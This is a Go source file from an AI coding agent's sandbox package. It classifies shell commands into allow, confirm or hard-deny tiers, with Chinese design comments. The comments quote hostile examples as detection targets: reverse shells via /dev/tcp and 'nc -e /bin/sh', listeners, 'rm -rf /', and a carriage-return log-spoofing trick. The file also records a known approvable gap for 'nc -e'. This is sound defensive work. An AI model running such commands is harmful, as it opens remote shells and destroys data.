// Package sandbox — 应用层判定规则引擎（A3 收编：两栈共用单一实现）。
//
// 背景（集中拍板 §5.1 更正①②）：
// - `security.CheckCommand` 早已是三层唯一门，真缺陷是 internal/sandbox **自带两套门**
// （legacy `Sandbox.Validate` + `Manager.ValidateCommand`）且**语义分歧**：
// legacy 有应用层网络拦截 + 写重定向越界检查（R4），Manager 两者皆无。
// - 收敛方式 ≠ 删除任一门（§5.1 行动约束："两栈语义未被钉死前不得直接删"）。
// 收敛方式 = **把两套门的规则判定收编到本文件的同一实现**：
// 两个入口都调 `evaluateAppLayer`，分歧在结构上不可能再出现
// （入口签名不变 ⇒ 既有调用方零改动）。
//
// 判定顺序（★ 标注者为本次新增项；其余与 legacy 基线逐条一致，deny-wins 铁律保持）：
//
//	① deny 全量扫描（deny-wins，无论 allow 是否命中）—— 判据 = **命令位**，见 matchDenyPattern
//	② allow 白名单（未配置则跳过）
//	③-0 ★新增（连带项，2026-10-02）：裸控制字符 ⇒ 拒（见 evalControlChars）
//	③ 命令替换 / 参数展开 / 进程替换
//	④ IFS 注入
//	⑤ 网络：⑤-a 断网时的经典网络命令；⑤-b 反向 shell / Critical 级（**任何** NetworkMode 都拦）
//	⑥ 写重定向越界（仅 WorkDir 非空）
package sandbox

import (
	"fmt"
	"path/filepath"
	"strings"
	"sync"

	"github.com/anchorandfish/whale-code/internal/sandbox/validator"
	"github.com/anchorandfish/whale-code/internal/security/failtier"
)

// degradeWarnOnce 保证 T1（常态降级）在终端只宣告一次；逐次事实由 Deficiency 上抛。
var degradeWarnOnce sync.Once

// appLayerRuleSet 是应用层规则集的**唯一输入**（两栈各自把自己那套配置填进来）。
type appLayerRuleSet struct {
	// DenyCommands 黑名单模式（deny-wins，全量扫描）。
	DenyCommands []string
	// AllowCommands 白名单；非空时未命中的命令一律拒绝。
	AllowCommands []string
	// NetworkIsolated 应用层网络隔离姿态（true = 拦截经典网络命令）。
	NetworkIsolated bool
	// WorkDir 写重定向边界基准；空 = 跳过该检查（legacy 基线行为）。
	WorkDir string
}

// VerdictTier 是应用层判定的**后果档**（，2026-10-05）。
//
// 引入动机：把两件不同的事从同一条通道里拆出来。
//
//	① 真不可逆（rm/dd/mkfs/format、反向 shell、终端注入）⇒ 硬拒是对的；
//	② 日常可逆（chmod/curl/命令替换/越界写）⇒ 硬拒是错的：
//
// 用户连"批准"的机会都没有，而"允许了还会被拒绝"是用户真实的痛点。
//
// 业内对照（同仓快照，全文见 内部工作回执 的「沙箱拒绝分档」对标证据件 2026-10-05）：
//
//	同类 CLI：固定危险名单只有 `rm -f/rm -rf/sudo`，且命中走 `Decision::Prompt`
//
// （**强制询问**）；批准后在**沙箱外**执行该条命令
// （对标证据件 `BypassSandboxFirstAttempt`，
// 消费点 对标证据件）。
//
//	同类 CLI：`Allow unsandboxed fallback` 开启时，沙箱失败可用
//
// `dangerouslyDisableSandbox` 重试。
//
//	⇒ 两类都不存在"日常命令硬拒且不可批准"这一档。
//
// ★ 分档只改变**后果**，不改变**判据**：命中哪条规则仍由 evaluateAppLayer 决定，
//
//	本类型只回答"命中之后该怎么办"。名单本身仍只有 defaultDenyCommands 一份
//	（见 tierForRule —— 它做的是**归类**，不是第二份名单）。
type VerdictTier int

const (
	// TierAllow 放行。
	TierAllow VerdictTier = iota
	// TierConfirm 需用户批准。批准后该条命令在**沙箱外**执行
	//（与 同类 CLI `BypassSandboxFirstAttempt` 同义）；批准是**逐条**的，不记忆。
	TierConfirm
	// TierHardDeny 硬拒，不可批准。只给"真不可逆 / 逃逸载体 / 终端注入 / 策略边界"。
	TierHardDeny
)

// String 供日志与测试判别使用（R4：结构化事实不得由散文断言）。
func (t VerdictTier) String() string {
	switch t {
	case TierAllow:
		return "allow"
	case TierConfirm:
		return "confirm"
	case TierHardDeny:
		return "hard_deny"
	}
	return "unknown"
}

// irreversibleDenyCommands 是 deny 名单里**真不可逆**的那一档（⇒ 硬拒）。
//
// ★ 这是对 defaultDenyCommands 的**归类**，不是第二份名单：
// - defaultDenyCommands 决定"拦什么"（唯一声明）；
// - 本集合决定"拦下来之后能不能被批准"。
//
// 未列入本集合的 deny 命令（curl/wget/chmod/chown/rm）落 TierConfirm。
//
// 判据沿革：
// - 用户 2026-10-05 拍板："rm/dd/mkfs/format 保持硬拒"；
// - **（2026-10-14 拍板）推翻其中 rm 的部分**：rm 降为可批准档
// （对齐 同类 CLI exec_policy.rs:671 "宁可问用户，不直接禁止"）；
// 灾难形态（rm -rf / 等）由 hardenNoApprovableEscape 的
// validator.AssessRmRfDangerousTarget 升级守卫兜住，仍硬拒。
var irreversibleDenyCommands = map[string]bool{
	"dd":     true,
	"mkfs":   true,
	"format": true,
}

// tierForRule 是**分档的唯一实现**（规则 → 后果）。
//
// 每个分支都必须能回答同一个问题：**这条命令是不是"不可逆"或"逃逸载体"？**
// 是 ⇒ 硬拒；否 ⇒ 让用户自己决定（可批准）。
func tierForRule(rule, hit string) VerdictTier {
	switch rule {
	case RuleDenyList:
		name := strings.ToLower(strings.TrimSpace(hit))
		if idx := strings.LastIndex(name, "/"); idx >= 0 {
			name = name[idx+1:] // `/bin/rm` ⇒ `rm`（与 matchDenyPattern 的 basename 口径一致）
		}
		if irreversibleDenyCommands[name] {
			return TierHardDeny
		}
		return TierConfirm

	case RuleSubstitution, RuleIFS, RuleNetworkCmd, RuleWriteRedirect:
		// 日常可逆：命令替换是当前最大误伤源（纯文本扫描，不分引号/注释）；
		// IFS 赋值、显式网络命令、越界写重定向都属"用户愿意就能做"。
		return TierConfirm

	case RuleNetworkCritical:
		// 反向 shell / exfil：既有契约是"任何 NetworkMode 都拦"（evalNetwork 注释），
		// 不因批准而放行。
		return TierHardDeny

	case RuleControlChar:
		// 裸 \r：终端显示欺骗 / 日志伪造，不是"用户想做的事"，没有批准的意义。
		return TierHardDeny

	case RuleAllowList:
		// 白名单未命中是**策略边界**（用户/仓库声明"只允许这些"），不是日常操作。
		return TierHardDeny
	}

	// 未知规则 fail-closed：宁可硬拒，不可默认可批准。
	return TierHardDeny
}

// appLayerVerdict 是应用层判定结果。
type appLayerVerdict struct {
	// Blocked 是否拒绝。
	Blocked bool
	// Reason 拒绝原因（人类可读；与 legacy 基线逐字一致，避免调用方文案漂移）。
	Reason string
	// Rule 命中的规则标识（机器可读，供审计/测试判别，替代"从原因字符串反推"）。
	Rule string
	// Tier 命中之后的**后果档**。Blocked=false 时恒为 TierAllow。
	Tier VerdictTier
	// Hit 命中的**具体 token**（可诊断性）—— 让"为什么被拒"从猜测变成指认：
	// DENYLIST ⇒ 名单里那一条；SUBSTITUTION ⇒ 8 个子串里命中的那一个。
	// ⚠️ Reason 字段**刻意保持逐字不变**（多处判据/文案钉住它），新信息只走本字段。
	Hit string
}

// 规则标识常量（结构化判据：不得由散文关键词断言 —— R4 收口同源要求）。
const (
	RuleDenyList        = "DENYLIST"
	RuleAllowList       = "ALLOWLIST"
	RuleControlChar     = "CONTROL_CHAR"
	RuleSubstitution    = "SUBSTITUTION"
	RuleIFS             = "IFS"
	RuleNetworkCmd      = "NETWORK_CMD"
	RuleNetworkCritical = "NETWORK_CRITICAL"
	RuleWriteRedirect   = "WRITE_REDIRECT"
)

// evaluateAppLayer 是应用层判定的**单一实现**（legacy 门与 Manager 门共用）。
//
// 调用方必须先自行处理"门是否生效"（legacy 的 enabled 门 / Manager 的 level 门）——
// 本函数只做规则判定，不做能力门（能力门缺失属族A T1，由 safety 层的 Deficiency 承担）。
//
// 结构：`evalRules`（逐条规则，与 legacy 基线逐条一致）→ `hardenNoApprovableEscape`
// （分档收窄后置条件）。**拆成两层是必需的**：规则命中顺序（deny-wins）属 legacy 契约
// 不能动，而"命中之后能不能被批准"是 新增的第二问 —— 两者若混在一个函数里，
// 下一次改分档就必须重排规则顺序，等于动安全基线。
func evaluateAppLayer(command string, rs appLayerRuleSet) appLayerVerdict {
	return hardenNoApprovableEscape(evalRules(command, rs), command)
}

// hardenNoApprovableEscape 是分档的**收窄后置条件**（反缝补项）。
//
// 为什么必须有它（本轮实测发现的**新引入风险**）：规则命中顺序里 ⑤-a
// （"断网姿态下的经典网络命令"）排在 ⑤-b（Critical 恒拦）**之前**，而 `nc`/`socat`
// 同时命中两者 ⇒ `nc -l 4444`（监听态）、`nc -e /bin/sh x` 会在 ⑤-a 处就被归成
// `RuleNetworkCmd`。若分档只看规则名，`RuleNetworkCmd → TierConfirm` 会把这些
// **逃逸/回连载体**一并变成"用户点一下就能过" —— 那是把 的放宽做成了漏洞。
//
// 判据取自**既有单一事实源** `DetectNetworkAccess`（不新增名单）：
//
//	Severity >= High ⇒ 硬拒
//
// · Critical：`bash -i >& /dev/tcp/...` 反向 shell
// · High ：监听态（`nc -l` / `socat TCP-LISTEN`）、`/dev/tcp/` 正向连接
//
//	Severity < High（Medium/Low）⇒ 保持可批准
//
// · 普通出站：curl/wget 取文件、ssh/scp、URL —— 这正是用户要的
// "装个依赖/拉个代码你问我就行"
//
// ⚠️ 已核实的**残留**（如实记录，勿当成已覆盖）：`nc -e /bin/sh x` 这种"出站型回连"
// 被既有 `DetectNetworkAccess` 判为 `AccessType=Outbound / Severity=Medium`
// （`network_detect.go:149-162`），因此仍落**可批准**档。这与 同类 CLI / 同类 CLI 的
// 行为一致（两类也只把 `rm -f/rm -rf/sudo` 列为不可自动放行，其余走"询问+沙箱外执行"），
// 且用户批准时看到的是**完整命令原文**。要收紧须先改 `DetectNetworkAccess` 的判据
// （属安全语义变更，另立决策），**不要**在这里补一个命令名黑名单。
func hardenNoApprovableEscape(v appLayerVerdict, command string) appLayerVerdict {
	if !v.Blocked || v.Tier == TierHardDeny {
		return v
	}
	normalized := normalizeWhitespace(strings.TrimSpace(command))
	result, _ := DetectNetworkAccess(normalized)
	if result.Severity >= SeverityHigh {
		v.Tier = TierHardDeny
		v.Hit = result.Pattern
	}

	// rm 降为可批准档后，灾难删除形态必须继续硬拒。
	// 判据与执行链 RM-RF-AST Critical **同源**（validator.AssessRmRfDangerousTarget
	// 复用 checkRmRfAST，唯一实现）—— 否则用户批准后仍会被执行链拦下，
	// "批准了还拒" = 病在窄集合复发。挂在本收窄后置条件（而非 deny 分支）
	// 的原因：与网络 Critical 升级同构 —— 任何可批准判定，只要命令含
	// "不可批准的逃逸/不可逆载体"就升级，规则来源无关。
	if v.Tier != TierHardDeny && validator.AssessRmRfDangerousTarget(normalized) {
		v.Tier = TierHardDeny
		v.Hit = "rm -rf (dangerous target)"
	}
	return v
}

// evalRules 是逐条规则的判定（判据与 legacy 基线逐条一致，deny-wins 铁律保持）。
func evalRules(command string, rs appLayerRuleSet) appLayerVerdict {
	trimmed := strings.TrimSpace(command)
	if trimmed == "" {
		return appLayerVerdict{}
	}
	normalized := normalizeWhitespace(trimmed)
	cmdName := extractCommandName(normalized)

	// ① deny 全量扫描（deny-wins，无论 allow 是否命中都执行）
	for _, pattern := range rs.DenyCommands {
		if matchDenyPattern(normalized, pattern) {
			return appLayerVerdict{
				Blocked: true,
				Rule:    RuleDenyList,
				Tier:    tierForRule(RuleDenyList, pattern),
				Hit:     pattern,
				Reason:  fmt.Sprintf("sandbox blocked execute (deny-wins): %s", pattern),
			}
		}
	}

	// ② allow 白名单（未配置 allow 则跳过白名单检查，进入后续检查）
	allowHit := false
	if len(rs.AllowCommands) > 0 {
		if !isCommandAllowed(cmdName, rs.AllowCommands) {
			return appLayerVerdict{
				Blocked: true,
				Rule:    RuleAllowList,
				Tier:    tierForRule(RuleAllowList, cmdName),
				Hit:     cmdName,
				Reason:  fmt.Sprintf("sandbox: command not in allowlist: %s", cmdName),
			}
		}
		allowHit = true
	}

	// ③-0 裸控制字符（同源补漏的**连带项**，见 evalControlChars 注释）
	if v, blocked := evalControlChars(trimmed); blocked {
		return v
	}

	if v, blocked := evalCommandShape(normalized); blocked {
		return v
	}

	// ⑤ 网络。allowHit 仅豁免 ⑤-a（用户显式允许的命令不受网络隔离限制），
	// **不**豁免 ⑤-b（反向 shell 是逃逸/exfil 载体，任何开关状态都拦）。
	if v, blocked := evalNetwork(normalized, cmdName, rs.NetworkIsolated, allowHit); blocked {
		return v
	}

	// ⑥ 写重定向边界（R4；原先只活在 legacy 门里 ⇒ G3/G6 语义分歧的成因）
	if rs.WorkDir != "" {
		absWorkDir, _ := filepath.Abs(rs.WorkDir)
		absWorkDir = resolvePath(absWorkDir)
		if reason := checkWriteRedirectBoundary(normalized, absWorkDir); reason != "" {
			return appLayerVerdict{
				Blocked: true,
				Rule:    RuleWriteRedirect,
				Tier:    tierForRule(RuleWriteRedirect, reason),
				Hit:     reason,
				Reason:  reason,
			}
		}
	}

	return appLayerVerdict{}
}

// evalControlChars 判定命令是否含**裸控制字符**（③-0， 同源补漏的连带项）。
//
// 为什么需要它：本批把 deny 判据从「整串词匹配」改为「命令位」后，
// 攻击向量用例 `echo safe\r rm -rf /`（internal/sandbox/attack_vectors_test.go:85
// CR-ABUSE）不再被拦 —— 因为它的命令位是 `echo`。逐条归因后确认：该命令在 bash 里
// **不会执行 rm**（`\r` 不是命令分隔符、也不在默认 IFS 内），所以"不拦"在"防执行"
// 意义上是对的；但它仍有**终端显示欺骗 / 日志注入**风险（`\r` 会让同一行的前段被覆盖，
// 日志里看起来是一条安全命令）。
//
// ⇒ 正确处置不是把词表加回来（那正是本批要退场的误证），而是**用对判据拦**：
// 拦控制字符本身。这条判据独立成立 —— 即使命令里没有 `rm`，裸 `\r` 也该拦。
//
// 边界：`\r\n` 视为换行（Windows 行尾）不拦；`\t` / `\n` 是正常空白不拦（多行命令常见）。
// `\x00` 等其余控制字符由 validator 层负责（本函数只收 `\r`，避免与 Layer 1 重叠判据）。
func evalControlChars(raw string) (appLayerVerdict, bool) {
	for i := 0; i < len(raw); i++ {
		if raw[i] != '\r' {
			continue
		}
		if i+1 < len(raw) && raw[i+1] == '\n' {
			i++ // \r\n = 换行
			continue
		}
		return appLayerVerdict{
			Blocked: true,
			Rule:    RuleControlChar,
			Tier:    tierForRule(RuleControlChar, "\\r"),
			Hit:     "\\r",
			Reason:  "sandbox blocked: bare carriage return in command (terminal/log injection risk)",
		}, true
	}
	return appLayerVerdict{}, false
}

// evalCommandShape 判定③命令替换 / ④IFS 注入。
func evalCommandShape(normalized string) (appLayerVerdict, bool) {
	// ③ 命令替换（残留修复，2026-10-08）：不再"见 $($ 就拦"，
	// 判定委托 validator.AssessSubstitution 唯一实现（同一语义两处实现是
	// 本仓最忌的形态 —— 只修了 validator 那份，真机预检照弹框）。
	if v, blocked := evalSubstitutionFamily(normalized); blocked {
		return v, true
	}
	// IFS 注入检测（应用层防护，对应 validator.checkIFSInjection）
	if containsIFSInjection(normalized) {
		return appLayerVerdict{
			Blocked: true,
			Rule:    RuleIFS,
			Tier:    tierForRule(RuleIFS, "IFS="),
			Hit:     "IFS=",
			Reason:  "sandbox blocked: IFS variable assignment detected (potential injection)",
		}, true
	}
	return appLayerVerdict{}, false
}

// execSubstitutionPatterns 是**执行型**替换的形态标记（判定委托 validator，
// 这里只做"要不要委托"的 presence 判断）。非执行型展开（${ $[ $((）不在其中
// —— 见 evalNonExecExpansion： 拍板刻意不动那一半。
var execSubstitutionPatterns = []string{"$(", "`", "<(", ">("}

// evalSubstitutionFamily 是 SUBSTITUTION 规则的委托式判定（残留修复）。
//
// 判定顺序与口径：
//
//	① 非执行型展开（${…} / $[…] / $((…)）： 刻意不动，保守照拦
//
// （TierConfirm，与改前逐字同档）—— 委托**不越界**到这一半；
//
//	② 执行型替换形态存在 ⇒ 三态委托 validator.AssessSubstitution：
//
// fail-closed（不配对/超深） ⇒ TierHardDeny
// 内层 Critical（rm -rf / 等） ⇒ TierHardDeny（按"直接执行"同一标准）
// 内层非 Critical ⇒ TierConfirm（可批准）
// 内层良性 ⇒ 放行（不再问用户 —— 本修复主目的）
//
//	③ 无执行型替换 ⇒ 不归本规则管（交给后续规则）。
//
// Reason 文案对 blocked 态**逐字保持** "sandbox blocked: command substitution
// not allowed"（纪律：多处判据/文案钉住它）；新增信息只走 Hit。
func evalSubstitutionFamily(normalized string) (appLayerVerdict, bool) {
	blockedVerdict := func(tier VerdictTier, hit string) (appLayerVerdict, bool) {
		return appLayerVerdict{
			Blocked: true,
			Rule:    RuleSubstitution,
			Tier:    tier,
			Hit:     hit,
			Reason:  "sandbox blocked: command substitution not allowed",
		}, true
	}

	// ① 非执行型展开： 刻意不动的一半（判据与改前逐字同源）。
	// 先于执行型检查：`$((1+1))` 含子串 `$(`，必须先按 `$((` 归类，防止
	// 被误当执行替换送进载荷抽取（探针实测：ExecutionPayloads 会把
	// `$((1+1))` 抽出载荷 "(1+1)"，纯委托会误放行 —— 这半必须留在本地）。
	for _, p := range []string{"${", "$[", "$(("} {
		if strings.Contains(normalized, p) {
			return blockedVerdict(tierForRule(RuleSubstitution, p), p)
		}
	}

	// ② 执行型替换 presence ⇒ 委托。
	hasExecPattern := false
	for _, p := range execSubstitutionPatterns {
		if strings.Contains(normalized, p) {
			hasExecPattern = true
			break
		}
	}
	if hasExecPattern {
		a := validator.AssessSubstitution(normalized)
		if a.FailClosed {
			// 解析不出（不配对/超深）：连"按直接执行同一标准"都做不到 ⇒ 硬拒。
			return blockedVerdict(TierHardDeny, "unbalanced-substitution")
		}
		if len(a.Findings) > 0 {
			tier := TierConfirm
			hit := "substitution-payload"
			for _, f := range a.Findings {
				if f.Severity >= validator.SeverityCritical {
					tier = TierHardDeny
					break
				}
			}
			return blockedVerdict(tier, hit)
		}
		// 内层良性 ⇒ 放行（不拦、不问 —— 但非执行型展开已在 ① 处理过）。
		return appLayerVerdict{}, false
	}

	// ③ 无执行型替换：不归本规则管。
	return appLayerVerdict{}, false
}

// evalNetwork 判定⑤网络阻断。
//
//	⑤-a 断网姿态（NetworkIsolated=true）下的经典网络命令（既有语义，逐字保持）
//	⑤-b 反向 shell / Critical 级网络行为 —— **任何 NetworkMode 都拦**
//
// ⑤-b 是 A2 的落点：网络开关打开后，nc -e / /dev/tcp / bash -i 这类
// 逃逸/exfil 载体此前**彻底脱管**（deny 列表移除 curl/wget + 网络检查整体跳过）。
// 处置方式遵循 A2 拍板的 Opt-B「复用同仓既有分级」而非新增命令名黑名单：
// 判据直接取自 `DetectNetworkAccess` + `ShouldBlockByNetworkMode`（后者此前为死代码）。
func evalNetwork(normalized, cmdName string, networkIsolated, allowHit bool) (appLayerVerdict, bool) {
	if networkIsolated && !allowHit {
		if reason := checkNetworkCommand(normalized, cmdName); reason != "" {
			return appLayerVerdict{
				Blocked: true,
				Rule:    RuleNetworkCmd,
				Tier:    tierForRule(RuleNetworkCmd, cmdName),
				Hit:     cmdName,
				Reason:  reason,
			}, true
		}
	}
	// ⑤-b：反向 shell 等 Critical 级行为恒拦（ShouldBlockByNetworkMode 对 Critical 的既有契约：
	// "result.Severity=Critical 时无视 networkMode 始终阻止"）。
	if result, _ := DetectNetworkAccess(normalized); result.Severity >= SeverityCritical {
		if ShouldBlockByNetworkMode(result, "host") {
			return appLayerVerdict{
				Blocked: true,
				Rule:    RuleNetworkCritical,
				Tier:    tierForRule(RuleNetworkCritical, result.Pattern),
				Hit:     result.Pattern,
				Reason: fmt.Sprintf(
					"sandbox blocked: network access %q always blocked (severity=critical, network switch does not lift it)",
					result.Pattern),
			}, true
		}
	}
	return appLayerVerdict{}, false
}

// networkIsolatedForConfig 解析 Manager 侧的网络隔离姿态（**单一实现**）。
//
// 此前 `SandboxConfig.NetworkMode` 与 `ShouldBlockByNetworkMode` 在生产路径**零消费**
// （只有测试调用）—— 收编时接入，避免"第二套网络策略"：
//
//	"none" / "proxy" ⇒ 隔离（proxy 由代理过滤出口，应用层不直接放行）
//	"host" ⇒ 不隔离（用户显式要求直连宿主网络）
//	"" / 未识别 ⇒ 跟随 env 单一事实源 WHALE_SANDBOX_ALLOW_NETWORK（默认断网）
func networkIsolatedForConfig(networkMode string) bool {
	switch strings.ToLower(strings.TrimSpace(networkMode)) {
	case "none", "proxy":
		return true
	case "host":
		return false
	default:
		return !networkAllowedByEnv()
	}
}

// Deficiency.Layer 的取值（沙箱侧判定链环节名，A5 家族）。
// 与 internal/security 的 DeficiencyLayer* 同约定：Layer/Tier 是机器判据，
// Reason 仅供人读，**不得**由散文反推环节（R4 收口同源）。
const (
	// DeficiencyLayerOSEnter OS 级隔离 Enter 失败（A5）。
	DeficiencyLayerOSEnter = "sandbox.os-enter"
)

// WarnDeficiency 把一条族A 降级事实打到**真实终端 stderr**（fd 2 直写）。
//
// 为什么 fd 2 直写：main.go 非 debug 模式把 os.Stderr 变量重定向到日志文件，
// 走 os.Stderr 的告警会被吞（"无出口的降级不可见"教训，见 status.go stderrDirect 注释）。
// 为什么按 Tier 去重：T1 是每次判定都会发生的常态（沙箱未启用），逐条打印会淹没终端；
// 机器可读的逐次事实由 Deficiency 上抛（Decision.Deficiencies / SandboxContext.Deficiencies），
// 终端告警只需"一次可见"。**两者不可互相替代**（R4：结构化事实不得由散文断言）。
func WarnDeficiency(d failtier.Deficiency) {
	switch d.Tier {
	case failtier.TierDegrade:
		degradeWarnOnce.Do(func() {
			fmt.Fprintf(stderrDirect(), "[sandbox] WARN degraded(%s): %s\n", d.Layer, d.String())
		})
	default:
		// T2/T3 不是常态 ⇒ 每次都必须可见
		fmt.Fprintf(stderrDirect(), "[sandbox] WARN %s\n", d.String())
	}
}
